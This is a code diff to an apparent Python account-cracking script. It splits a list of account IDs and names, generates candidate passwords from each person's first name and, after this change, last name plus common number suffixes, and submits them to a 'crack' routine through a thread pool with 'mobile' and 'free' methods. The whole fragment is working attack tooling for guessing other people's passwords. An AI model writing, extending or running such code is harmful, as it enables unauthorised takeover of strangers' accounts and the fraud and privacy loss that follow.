@@ -240,7 +240,7 @@ def first():
 				else:
 					pwv.append(frs+'123')
 					pwv.append(frs+'12345')
-			else:
+			else: 
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
@@ -280,6 +280,7 @@ def name2():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
+			lst = nmf.split(' ')[1]
 			pwv = ['445566']
 			if len(nmf)<6:
 				if len(frs)<3:
@@ -296,6 +297,12 @@ def name2():
 					pwv.append(frs+'12345')
 					pwv.append(frs+'1234')
 					pwv.append(frs+'786')
+					pwv.append(lst+'123')
+					pwv.append(lst+'12345')
+					pwv.append(lst+'1234')
+					pwv.append(lst+'786')
+					pwv.append(frs+'12')
+					pwv.append(lst+'12')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
